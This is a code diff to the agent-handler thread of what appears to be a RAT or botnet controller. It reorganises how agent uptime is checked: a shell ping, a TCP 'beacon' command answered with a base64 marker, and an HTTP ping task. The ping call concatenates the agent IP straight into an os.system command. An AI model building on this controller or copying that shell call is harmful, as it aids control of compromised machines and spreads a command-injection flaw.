@@ -14,6 +14,7 @@ class Handler(threading.Thread):
 
     def __init__(self, agent_id, loggers, transport_type, client=None, client_address=None):
         threading.Thread.__init__(self)
+        self.transport_type = transport_type
 
         if transport_type == "TCP":
             self.client_address = client_address
@@ -32,7 +33,6 @@ class Handler(threading.Thread):
         self.beacon_wait = False
         self.os = ''
         self.interactive = False
-        self.transport_type = transport_type
 
         self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
                                                         # [0] = PING, [1] = BEACON
@@ -125,35 +125,40 @@ class Handler(threading.Thread):
         while(True):
             time.sleep(random.randint(10,40))
             
-#---OLD _ COMPARE
-                # ping = os.system("ping -c 2 -w2 " + self.ip + " > /dev/null 2>&1")
-                # if ping == 0:
-                #     self.status[0] = "UP"
-                #     self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - PING : UP')
-
-                # else:
-                #     self.status[0] = "DOWN"
-                #     self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - PING : DOWN')
-#---
             # Check HOST-STATUS
-
-            # This actually executes a linux-ping command to test and see if the host is actually up and turned on/ receiving connections. Not necessarily
-            # communicating or beaconing to the agent itself. I think your code under this portion would be a beacon, and should be put under there.
-            # You should also handle the output and log it to 'uptime.log' rather than printing, as that could get annoying. See below. 
-            # - Josh
             try:
-                # TCP
-                if(self.transport_type == "TCP"):
-                    # exec linux ping command to check if host is up
-                    ping = os.system("ping -c 2 -w2 " + self.ip + " > /dev/null 2>&1")
+                # exec linux ping command to check if host is up
+                ping = os.system("ping -c 2 -w2 " + self.ip + " > /dev/null 2>&1")
 
-                    # Record
-                    if ping == 0:
-                        self.status[0] = "UP"
+                # Record
+                if ping == 0:
+                    self.status[0] = "UP"
 
-                    else:
-                        self.status[0] = "DOWN"
-                # HTTP
+                else:
+                    self.status[0] = "DOWN"
+            except:
+                # Error code
+                self.status[0] = "ERR"
+                self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - PING : ERROR')
+
+
+            # Check RAT-STATUS
+            if not self.beacon_wait:            # If not in mode that could jumble up the output to and from the agent with the beacons, because if we're in that mode then we know its beaconing already
+                if self.transport_type == "TCP":
+                    try:
+                        msg = self.execute("beacon", True)
+                        
+                        if "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy" in msg:
+                            self.status[1] = "UP"
+                            self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - BEACON : UP')
+                        else:
+                            self.status[1] = "DOWN"
+                            self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - BEACON : DOWN')
+
+                    except:
+                        self.status[1] = "ERR"
+                        self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - BEACON : ERROR')
+
                 elif(self.transport_type == "HTTP"):
                     request_payload_string = f'[{{"task_type":"ping","agent_id":{self.bot_id}}}]'
                     request_payload = json.loads(request_payload_string)
@@ -168,31 +173,7 @@ class Handler(threading.Thread):
                                 wfc = False
                                 self.status[0] = "UP"
                             else:
-                                self.status[0] = "DOWN"
-
-
-
-            except:
-                # Error code
-                self.status[0] = "ERR"
-                self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - PING : ERROR')
-
-
-            # Check RAT-STATUS
-            if not self.beacon_wait:            # If not in mode that could jumble up the output to and from the agent with the beacons, because if we're in that mode then we know its beaconing already
-                try:
-                    msg = self.execute("beacon", True)
-                    
-                    if "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy" in msg:
-                        self.status[1] = "UP"
-                        self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - BEACON : UP')
-                    else:
-                        self.status[1] = "DOWN"
-                        self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - BEACON : DOWN')
-
-                except:
-                    self.status[1] = "ERR"
-                    self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - BEACON : ERROR')
+                                self.status[0] = "DOWN"                
 
 #------------------------------------------------------------------------------------------------------------------------------
 
